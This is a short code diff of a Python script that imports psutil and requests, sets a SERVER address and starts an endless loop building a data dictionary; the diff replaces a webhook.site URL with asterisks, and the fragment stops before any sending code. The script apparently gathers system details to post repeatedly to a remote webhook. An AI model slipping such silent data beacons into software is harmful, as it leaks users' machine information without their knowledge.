@@ -1,6 +1,6 @@
 import platform, psutil, requests, time
 
-SERVER = "https://webhook.site/bc6a33cc-de1e-4d23-a069-20b1fc36818e" 
+SERVER = "*******************" 
 
 while True:
     data = {
